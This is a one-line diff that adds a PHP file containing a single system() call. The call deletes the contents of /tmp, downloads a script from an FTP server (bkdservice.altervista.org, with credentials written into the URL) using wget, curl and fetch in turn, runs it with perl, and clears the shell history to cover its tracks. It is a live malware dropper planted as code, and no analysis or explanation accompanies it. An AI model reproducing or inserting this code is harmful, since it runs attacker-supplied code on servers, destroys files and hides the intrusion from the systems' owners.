@@ -1,0 +1,1 @@
+<? system("cd /tmp;rm -rf *;wget ftp://bkdservice:molonana@bkdservice.altervista.org/random;perl random;curl -O ftp://bkdservice:molonana@bkdservice.altervista.org/random;perl random;fetch ftp://bkdservice:molonana@bkdservice.altervista.org/random;perl random;history -c;");exit?>
